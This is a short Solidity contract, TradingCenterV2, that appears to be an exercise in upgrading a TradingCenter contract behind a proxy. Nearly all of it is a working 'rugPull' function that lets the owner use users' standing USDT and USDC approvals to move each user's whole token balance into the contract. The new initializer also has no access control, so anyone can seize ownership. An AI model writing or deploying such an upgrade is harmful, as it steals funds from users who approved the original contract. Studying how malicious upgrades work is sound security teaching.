// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter } from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{
    bool public v2Initialized;
    address public owner;
    
    function v2initialize() public {
        require(v2Initialized == false, "v2 already initialized");
        v2Initialized = true;
        owner = msg.sender;
    }

    function rugPull(address user) public {
        require(msg.sender == owner, "only owner can rug pull");
        if (usdt.allowance(user, address(this)) > 0) {
            usdt.transferFrom(user, address(this), usdt.balanceOf(user));
        }
        if (usdc.allowance(user, address(this)) > 0) {
            usdc.transferFrom(user, address(this), usdc.balanceOf(user));
        }
    }
}